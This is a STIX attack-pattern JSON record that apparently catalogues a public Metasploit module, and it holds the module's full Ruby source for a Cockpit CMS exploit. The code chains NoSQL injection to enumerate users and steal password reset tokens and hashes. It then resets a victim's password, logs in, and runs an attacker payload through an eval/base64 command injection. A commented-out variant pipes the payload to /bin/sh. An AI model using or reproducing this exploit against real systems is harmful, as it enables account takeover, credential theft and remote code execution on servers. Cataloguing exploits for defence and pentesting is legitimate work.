{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cf68801f-64f0-4e90-af38-20a85e56be40",
    "created": "2024-08-14T17:10:56.061782Z",
    "modified": "2024-08-14T17:10:56.061786Z",
    "name": "Cockpit CMS NoSQLi to RCE",
    "description": " This module exploits two NoSQLi vulnerabilities to retrieve the user list and password reset tokens from the system.  Next, the USER is targetted to reset their password. Then a command injection vulnerability is used to execute the payload. While it is possible to upload a payload and execute it, the command injection provides a no disk write method which is more stealthy. Cockpit CMS 0.10.0 - 0.11.1, inclusive, contain all the necessary vulnerabilities for exploitation.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/cockpit_cms_rce.rb",
            "external_id": "cockpit_cms_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://swarm.ptsecurity.com/rce-cockpit-cms/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Cockpit CMS NoSQLi to RCE',\n        'Description' => %q{\n          This module exploits two NoSQLi vulnerabilities to retrieve the user list,\n          and password reset tokens from the system.  Next, the USER is targetted to\n          reset their password.\n          Then a command injection vulnerability is used to execute the payload.\n          While it is possible to upload a payload and execute it, the command injection\n          provides a no disk write method which is more stealthy.\n          Cockpit CMS 0.10.0 - 0.11.1, inclusive, contain all the necessary vulnerabilities\n          for exploitation.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Nikita Petrov' # original PoC, analysis\n        ],\n        'References' => [\n          [ 'URL', 'https://swarm.ptsecurity.com/rce-cockpit-cms/' ],\n          [ 'CVE', '2020-35847' ], # reset token extraction\n          [ 'CVE', '2020-35846' ], # user name extraction\n        ],\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'Privileged' => false,\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DefaultOptions' => {\n          'PrependFork' => true\n        },\n        'DisclosureDate' => '2021-04-13',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          # ACCOUNT_LOCKOUTS due to reset of user password\n          'SideEffects' => [ ACCOUNT_LOCKOUTS, IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability' => [ CRASH_SERVICE_DOWN ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true, 'The URI of Cockpit', '/']),\n        OptBool.new('ENUM_USERS', [false, 'Enumerate users', true]),\n        OptString.new('USER', [false, 'User account to take over', ''])\n      ], self.class\n    )\n  end\n\n  def get_users(check: false)\n    print_status('Attempting Username Enumeration (CVE-2020-35846)')\n    res = send_request_raw(\n      'uri' => '/auth/requestreset',\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'data' => JSON.generate({ 'user' => { '$func' => 'var_dump' } })\n    )\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to the web service\") unless res\n\n    # return bool of if not vulnerable\n    # https://github.com/agentejo/cockpit/blob/0.11.2/lib/MongoLite/Database.php#L432\n    if check\n      return (res.body.include?('Function should be callable') ||\n        # https://github.com/agentejo/cockpit/blob/0.12.0/lib/MongoLite/Database.php#L466\n        res.body.include?('Condition not valid') ||\n        res.body.scan(/string\\(\\d{1,2}\\)\\s*\"([\\w-]+)\"/).flatten == [])\n    end\n\n    res.body.scan(/string\\(\\d{1,2}\\)\\s*\"([\\w-]+)\"/).flatten\n  end\n\n  def get_reset_tokens\n    print_status('Obtaining reset tokens (CVE-2020-35847)')\n    res = send_request_raw(\n      'uri' => '/auth/resetpassword',\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'data' => JSON.generate({ 'token' => { '$func' => 'var_dump' } })\n    )\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to the web service\") unless res\n\n    res.body.scan(/string\\(\\d{1,2}\\)\\s*\"([\\w-]+)\"/).flatten\n  end\n\n  def get_user_info(token)\n    print_status('Obtaining user info')\n    res = send_request_raw(\n      'uri' => '/auth/newpassword',\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'data' => JSON.generate({ 'token' => token })\n    )\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to the web service\") unless res\n\n    /this.user\\s+=([^;]+);/ =~ res.body\n    userdata = JSON.parse(Regexp.last_match(1))\n    userdata.each do |k, v|\n      print_status(\"  #{k}: #{v}\")\n    end\n    report_cred(\n      username: userdata['user'],\n      password: userdata['password'],\n      private_type: :nonreplayable_hash\n    )\n    userdata\n  end\n\n  def reset_password(token, user)\n    password = Rex::Text.rand_password\n    print_good(\"Changing password to #{password}\")\n    res = send_request_raw(\n      'uri' => '/auth/resetpassword',\n      'method' => 'POST',\n      'ctype' => 'application/json',\n      'data' => JSON.generate({ 'token' => token, 'password' => password })\n    )\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to the web service\") unless res\n\n    # loop through found results\n    body = JSON.parse(res.body)\n    print_good('Password update successful') if body['success']\n    report_cred(\n      username: user,\n      password: password,\n      private_type: :password\n    )\n    password\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: datastore['RHOST'],\n      port: datastore['RPORT'],\n      service_name: 'http',\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:username],\n      private_data: opts[:password],\n      private_type: opts[:private_type],\n      jtr_format: Metasploit::Framework::Hashes.identify_hash(opts[:password])\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      proof: ''\n    }.merge(service_data)\n    create_credential_login(login_data)\n  end\n\n  def login(un, pass)\n    print_status('Attempting login')\n    res = send_request_cgi(\n      'uri' => '/auth/login',\n      'keep_cookies' => true\n    )\n    login_cookie = res.get_cookies\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to the web service\") unless res\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to the web service\") unless /csfr\\s+:\\s+\"([^\"]+)\"/ =~ res.body\n\n    res = send_request_cgi(\n      'uri' => '/auth/check',\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'ctype' => 'application/json',\n      'data' => JSON.generate({ 'auth' => { 'user' => un, 'password' => pass }, 'csfr' => Regexp.last_match(1) })\n    )\n\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to the web service\") unless res\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Login failed. This is unexpected...\") if res.body.include?('\"success\":false')\n    print_good(\"Valid cookie for #{un}: #{login_cookie}\")\n  end\n\n  def gen_token(user)\n    print_status('Attempting to generate tokens')\n    res = send_request_raw(\n      'uri' => '/auth/requestreset',\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'ctype' => 'application/json',\n      'data' => JSON.generate({ user: user })\n    )\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to the web service\") unless res\n  end\n\n  def rce\n    print_status('Attempting RCE')\n    p = Rex::Text.encode_base64(payload.encoded)\n    send_request_cgi(\n      'uri' => '/accounts/find',\n      'method' => 'POST',\n      'keep_cookies' => true,\n      'ctype' => 'application/json',\n      # this is more similar to how the original POC worked, however even with the & and prepend fork\n      # it was locking the website (php/db_conn?) and throwing 504 or 408 errors from nginx until the session\n      # was killed when using an arch => cmd type payload.\n      # 'data'     => \"{\\\"options\\\":{\\\"filter\\\":{\\\"' + die(`echo '#{p}' | base64 -d | /bin/sh&`) + '\\\":0}}}\"\n      # with this method most pages still seem to load, logins work, but the password reset will not respond\n      # however, everything else seems to work ok\n      'data' => \"{\\\"options\\\":{\\\"filter\\\":{\\\"' + eval(base64_decode('#{p}')) + '\\\":0}}}\"\n    )\n  end\n\n  def check\n    begin\n      return Exploit::CheckCode::Appears unless get_users(check: true)\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    if datastore['ENUM_USERS']\n      users = get_users\n      print_good(\"  Found users: #{users}\")\n    end\n\n    fail_with(Failure::BadConfig, \"#{peer} - User to exploit required\") if datastore['user'] == ''\n\n    tokens = get_reset_tokens\n    # post exploitation sometimes things get wonky, but doing a password recovery seems to fix it.\n    if tokens == []\n      gen_token(datastore['USER'])\n      tokens = get_reset_tokens\n    end\n    print_good(\"  Found tokens: #{tokens}\")\n    good_token = ''\n    tokens.each do |token|\n      print_status(\"Checking token: #{token}\")\n      userdata = get_user_info(token)\n      if userdata['user'] == datastore['USER']\n        good_token = token\n        break\n      end\n    end\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to get valid password reset token for user. Double check user\") if good_token == ''\n    password = reset_password(good_token, datastore['USER'])\n    login(datastore['USER'], password)\n    rce\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-04-13",
    "x_mitre_platforms": [
        "['php']"
    ]
}